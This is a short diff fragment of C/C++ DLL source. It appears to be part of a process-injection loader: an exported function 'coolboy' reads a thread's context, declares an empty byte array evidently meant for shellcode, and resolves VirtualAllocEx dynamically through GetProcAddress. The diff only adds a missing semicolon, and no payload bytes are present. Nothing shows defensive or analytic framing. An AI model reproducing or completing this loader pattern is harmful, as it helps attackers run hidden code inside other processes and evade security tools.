@@ -63,7 +63,7 @@ extern "C" __declspec(dllexport) void coolboy()
     da.ContextFlags = CONTEXT_FULL;
 
     GetThreadContext(pei.hThread, &da);
-unsigned char itsthecod345[] = {}
+unsigned char itsthecod345[] = {};
     
 LPVOID (*pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
     (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
